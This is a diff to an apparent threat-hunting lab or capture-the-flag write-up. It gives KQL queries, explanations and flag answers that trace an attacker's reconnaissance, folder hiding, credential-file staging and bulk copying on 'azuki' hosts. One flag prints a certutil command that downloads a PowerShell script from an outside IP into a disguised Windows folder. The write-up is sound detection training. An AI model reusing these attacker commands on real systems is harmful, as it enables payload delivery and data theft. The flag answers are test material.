@@ -903,6 +903,8 @@ DeviceProcessEvents
     ProcessCommandLine
 | order by TimeGenerated asc
 ```
+<img width="761" height="130" alt="image" src="https://github.com/user-attachments/assets/253e0373-b055-4d08-9533-2d2b10bda5d0" />
+
 ## Purpose and Explanation – Remote Network Share Enumeration (net.exe view \\10.1.0.188)
 
 This query examines process execution events on azuki-related systems during the post-dwell investigation window to detect remote share discovery activity. It filters for **net.exe** executions and further restricts results to command lines containing **\\**, indicating UNC paths that target remote systems. The results highlight the command **net.exe view \\10.1.0.188**, showing the attacker enumerated SMB shares on a specific remote host. This confirms deliberate post-compromise network discovery to identify accessible systems and data for potential lateral movement or data collection.
@@ -918,3 +920,198 @@ This query examines process execution events on azuki-related systems during the
 
 #25 Flag 25 = "net.exe" view \\10.1.0.188
 ----
+```kql
+DeviceProcessEvents
+| where DeviceName contains "azuki"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName == "whoami.exe"
+| project
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="780" height="130" alt="image" src="https://github.com/user-attachments/assets/c6ec9185-2220-4942-9a7c-295cf109df6d" /> 
+
+## Purpose and Explanation
+
+This query detects executions of `whoami.exe` on azuki systems to identify privilege and identity reconnaissance following compromise. Attackers commonly use this command, often with the `/all` flag, to enumerate group memberships, security privileges, and token context. By capturing the full command line and associated account information, the query confirms intentional discovery activity rather than benign background execution. This behavior aligns with post-exploitation situational awareness and typically precedes privilege escalation or lateral movement.
+
+## Thought Process – Privilege Enumeration via whoami.exe
+
+1. The goal is to identify execution of `whoami.exe`, a common attacker utility for enumerating user context and privileges.
+2. Filtering by `DeviceName` restricts analysis to the compromised azuki host.
+3. Applying a defined time range focuses on post-compromise activity.
+4. Filtering on `FileName == "whoami.exe"` isolates identity discovery commands.
+5. Projecting execution metadata provides visibility into who executed the command and how it was used.
+6. Ordering results chronologically creates a clear timeline of enumeration activity.
+
+#26 Flag 26 = "whoami.exe" /all
+----
+```kql
+DeviceProcessEvents
+| where DeviceName contains "azuki"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName == "ipconfig.exe"
+| where ProcessCommandLine contains "/all"
+| project
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="764" height="127" alt="image" src="https://github.com/user-attachments/assets/d327d95d-6987-4aae-be64-92bb34ed2aec" />
+
+## Purpose and Explanation
+
+This query identifies the execution of `ipconfig.exe /all` on azuki systems to detect network discovery activity following compromise. The `/all` flag exposes comprehensive network details such as IP addresses, DNS servers, gateways, and adapter configurations. Attackers commonly run this command to understand network layout, identify routing paths, and plan lateral movement. Capturing the full command line and executing account confirms intentional reconnaissance rather than routine background activity. This behavior aligns with internal discovery conducted after initial access and before further expansion within the environment.
+
+## Thought Process – Network Configuration Enumeration via ipconfig.exe
+
+1. The objective is to identify execution of `ipconfig.exe` with the `/all` flag, which reveals detailed network configuration data.
+2. Filtering by `DeviceName` containing "azuki" scopes the query to the affected host(s).
+3. Applying the defined time window focuses on post-compromise activity.
+4. Restricting `FileName` to `ipconfig.exe` isolates native Windows network enumeration.
+5. Filtering for `/all` ensures only detailed enumeration attempts are captured.
+6. Projecting execution metadata provides accountability and context for the activity.
+7. Ordering by time establishes a clear sequence of discovery actions.
+
+
+#27 Flag 27 = "ipconfig.exe" /all
+----
+```kql
+DeviceProcessEvents
+| where DeviceName contains "azuki"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName == "attrib.exe"
+| where ProcessCommandLine contains "+h"
+| where ProcessCommandLine contains "+s"
+| project
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="767" height="115" alt="image" src="https://github.com/user-attachments/assets/de92aaf9-ee62-46f2-9e65-72a41d022655" /> 
+<img width="276" height="69" alt="image" src="https://github.com/user-attachments/assets/4502e78e-2dc7-47d0-bbd9-3bd50c0ac8e8" />
+
+## Purpose and Explanation
+
+This query identifies executions of `attrib.exe` using the `+h` and `+s` flags on azuki systems, which mark files or directories as hidden and system-protected. Attackers commonly apply these attributes to conceal malicious files or staging locations from casual inspection and basic security reviews. The command targets `C:\Windows\Logs\CBS`, a legitimate-looking Windows directory that blends into normal operating system activity. Using a trusted system path reduces suspicion while allowing staged data to persist during the attack lifecycle. Capturing the full command line and executing account confirms deliberate concealment rather than routine system behavior, supporting evidence of stealthy post-compromise activity.
+
+## Thought Process – File and Directory Hiding via attrib.exe
+
+1. The objective is to detect use of `attrib.exe` to modify file or directory attributes for concealment.
+2. Filtering by `DeviceName` containing "azuki" scopes the query to the affected host(s).
+3. Applying the defined time window focuses on post-compromise and dwell-time activity.
+4. Restricting `FileName` to `attrib.exe` isolates use of the native Windows attribute utility.
+5. Requiring both `+h` and `+s` flags ensures the query captures intentional hiding behavior (hidden + system).
+6. Projecting execution metadata provides clear attribution and forensic context.
+7. Ordering by time establishes when concealment occurred relative to other attacker actions.
+
+#28/29 Flags 29/30 = "attrib.exe" +h +s C:\Windows\Logs\CBS = C:\Windows\Logs\CBS 
+----
+```kql
+DeviceProcessEvents
+| where DeviceName contains "azuki"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName == "certutil.exe"
+| where ProcessCommandLine contains "-urlcache"
+| project
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="699" height="48" alt="image" src="https://github.com/user-attachments/assets/dd789aa4-c015-4684-bf6b-1f843a8bb72d" />
+## Purpose and Explanation
+
+This query detects the use of `certutil.exe` with the `-urlcache` flag on azuki systems, which enables downloading files from a remote URL using a built-in Windows utility. The identified command downloads `ex.ps1` from `http://78.141.196.6:7331` and writes it to `C:\Windows\Logs\CBS\ex.ps1`, a legitimate-looking system directory chosen to reduce suspicion. Attackers frequently abuse certutil because it is signed, trusted, and commonly present on Windows systems, allowing payload retrieval without introducing custom tools. Storing the script in a trusted Windows path further aids stealth and persistence. This activity confirms external payload delivery and marks a clear transition from reconnaissance to active execution within the attack lifecycle.
+
+## Thought Process – Payload Retrieval via certutil.exe
+
+1. The objective is to detect abuse of native Windows utilities for downloading external payloads.
+2. Filtering by `DeviceName` containing "azuki" scopes the query to the affected host(s).
+3. Applying the defined time window focuses on attacker activity during the dwell period.
+4. Restricting `FileName` to `certutil.exe` isolates use of a legitimate Windows binary often abused for LOLBins.
+5. Filtering on `ProcessCommandLine contains "-urlcache"` captures download functionality rather than certificate management.
+6. Projecting execution time, device, account, and full command line provides attribution and forensic clarity.
+7. Ordering results chronologically establishes when payload retrieval occurred in the attack chain.
+
+#30 Flag 30 = "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
+----
+```kql
+DeviceFileEvents
+| where DeviceName contains "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where InitiatingProcessAccountName == "fileadmin"
+| where FolderPath contains @"C:\Windows\Logs\CBS\"
+| where FileName endswith ".csv"
+| where ActionType == "FileCreated"
+| project
+    TimeGenerated,
+    DeviceName,
+    InitiatingProcessAccountName,
+    FileName,
+    FolderPath,
+    ActionType
+| order by TimeGenerated asc
+```
+<img width="773" height="208" alt="image" src="https://github.com/user-attachments/assets/57cb8a99-8d83-4746-81d4-3d603f5bf1b1" />  
+
+## Purpose and Explanation
+
+This query identifies the creation of CSV files in `C:\Windows\Logs\CBS\` on azuki-fileserver01 by the administrative account `fileadmin`. The resulting artifact, **IT-Admin-Passwords.csv**, indicates that sensitive data was exported into a structured format suitable for review or exfiltration. CSV files are commonly used by attackers to consolidate harvested credentials or administrative information because they are lightweight and easy to transfer. The choice of a trusted Windows system directory helps the file blend into normal operating system activity and reduces the likelihood of detection. The use of an administrative account further confirms this action was intentional and aligned with post-compromise objectives. Overall, this event represents a clear data staging step prior to exfiltration or lateral movement.
+
+## Thought Process – Staged Data Creation on File Server
+
+1. The objective is to identify files created as part of data staging prior to exfiltration.
+2. Filtering by `DeviceName` containing "azuki-fileserver01" scopes the query to the compromised file server.
+3. Applying the defined time window focuses on attacker activity during the post-compromise phase.
+4. Filtering on `InitiatingProcessAccountName == "fileadmin"` isolates activity performed under an administrative context.
+5. Restricting `FolderPath` to `C:\Windows\Logs\CBS\` targets a legitimate-looking system directory commonly abused for stealth.
+6. Filtering for `.csv` files highlights structured data exports rather than normal system artifacts.
+7. Limiting results to `FileCreated` actions confirms the moment data was written to disk.
+8. Ordering by `TimeGenerated` establishes when staging occurred relative to other attack actions.
+
+#31 Flag 31 = IT-Admin-Passwords.csv
+----
+```kql
+DeviceProcessEvents
+| where DeviceName contains "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where InitiatingProcessAccountName == "fileadmin"
+| where ProcessCommandLine contains "copy"
+| project
+    TimeGenerated,
+    DeviceName,
+    InitiatingProcessAccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="710" height="114" alt="image" src="https://github.com/user-attachments/assets/a458140e-6ac0-48d9-b0ea-b955222150e7" />
+## Purpose and Explanation
+
+This query detects the use of **xcopy.exe** by the administrative account `fileadmin` on azuki-fileserver01 to copy data from `C:\FileShares\IT-Admin` into `C:\Windows\Logs\CBS\it-admin`. The XCOPY flags `/E /I /H /Y` indicate a recursive copy of all directories, including hidden and system files, without prompting for confirmation. This behavior is consistent with deliberate bulk data staging rather than routine administration. By copying sensitive IT administrative files into a trusted Windows system directory, the attacker reduced visibility while consolidating data for later exfiltration. The use of a built-in Windows utility further allowed the activity to blend in with legitimate system operations. Overall, this event represents a clear data aggregation step in the attack lifecycle.
+
+## Thought Process – Administrative Data Staging via XCOPY
+
+1. The objective is to identify file transfer activity associated with attacker-controlled data staging.
+2. Filtering by `DeviceName` containing `azuki-fileserver01` scopes the query to the affected file server.
+3. Applying the defined time window focuses on post-compromise and data handling activity.
+4. Filtering on `InitiatingProcessAccountName == "fileadmin"` isolates actions performed with elevated administrative privileges.
+5. Searching for `ProcessCommandLine contains "copy"` captures file copy operations rather than file creation or deletion.
+6. Projecting the full `ProcessCommandLine` provides visibility into the source, destination, and copy flags used.
+7. Ordering by `TimeGenerated` establishes when staging occurred relative to earlier discovery and collection steps.
+
+ #32 Flag 32 = "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
+ ----
